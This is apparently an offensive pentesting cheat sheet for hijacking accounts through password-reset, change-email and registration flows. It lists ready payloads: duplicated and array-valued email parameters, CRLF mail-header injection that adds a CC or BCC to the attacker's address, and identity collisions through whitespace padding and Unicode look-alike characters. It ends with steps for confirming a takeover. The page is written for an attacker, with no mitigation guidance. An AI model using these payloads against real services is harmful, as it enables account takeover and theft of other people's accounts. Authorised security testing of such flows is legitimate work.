# Email-parameter and identity-collision payloads — Open WHEN: a reset/change-email/registration flow takes an email or username and you want it delivered to, or matched against, an address you control

These payloads make a reset or change flow act on the victim's account while
routing the mail (or the match) to you. Try them one at a time against the
exact parameter the flow reads; watch where the confirmation mail lands.

## Email parameter pollution / multi-value
Submit the victim plus your address so the app authorises on one and mails the other.

```
# duplicate parameter (parameter pollution)
email=victim@mail.com&email=hacker@mail.com

# array of emails (JSON body)
{"email":["victim@mail.com","hacker@mail.com"]}

# separator-joined values
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```

## Mail-header injection (CR/LF) for CC/BCC
If the address is dropped into a mail header unsanitised, inject a CC/BCC so a
copy of the reset reaches you.

```
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com
```

## Username / identity collision
The app may match accounts loosely (trim, case-fold, normalise) while treating
them as distinct on registration.

- **Whitespace padding.** Register `"admin "` (leading/trailing spaces), request
  a reset for your padded name; the token may reset the real `admin`. This is
  CTFd's CVE-2020-7245.
- **Unicode normalization.** Register a look-alike that case-maps or normalises
  to the victim's. Victim `demo@gmail.com`, you register `demⓞ@gmail.com`
  (circled o). After normalisation the two collide and the reset hits the victim.
  Tools: `unisub` to suggest convertible code points; the Unicode pentester
  cheatsheet for a per-platform character list.

## Probing for the right vector
- Try each variant in isolation so you can attribute the behaviour.
- Watch three oracles: (1) which inbox actually receives the mail, (2) whether
  the response confirms the victim's account, (3) whether you can subsequently
  log in as the victim. Only (3) is a confirmed takeover.
